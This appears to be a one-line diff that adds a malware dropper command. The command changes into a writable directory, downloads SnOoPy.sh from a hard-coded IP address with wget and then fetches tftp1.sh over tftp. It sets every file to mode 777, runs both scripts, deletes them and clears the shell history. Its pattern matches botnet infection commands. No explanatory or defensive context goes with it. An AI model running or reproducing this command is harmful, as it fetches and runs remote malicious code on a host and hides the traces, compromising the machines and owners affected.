@@ -1,0 +1,1 @@
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://173.232.146.52/SnOoPy.sh; chmod 777 *; sh SnOoPy.sh; tftp -g 173.232.146.52 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c
